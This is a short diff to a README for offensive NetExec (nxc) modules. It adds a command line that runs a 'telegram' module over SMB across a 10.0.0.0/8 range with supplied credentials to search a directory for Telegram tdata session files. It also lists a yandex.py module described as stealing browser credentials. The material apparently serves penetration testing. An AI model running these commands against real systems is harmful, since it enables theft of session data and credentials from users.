@@ -19,6 +19,10 @@ If you have nxc installed via pipx, then put the modules on the path<br>
    ```bash
    nxc smb 10.0.0.0/8 -u 'user' -p 'password' -M telegram
    ```
+   Search tdata from DIR
+   ```bash
+   nxc smb 10.0.0.0/8 -u 'user' -p 'password' -M telegram -o SEARCH_DIR=c:\users\public
+   ```
    *Reference:* https://github.com/CICADA8-Research/Penetration/tree/main/nxc%20modules
 4. **yandex.py**<br>
    *Description:* Stealing creds from Yandex Browser.<br>
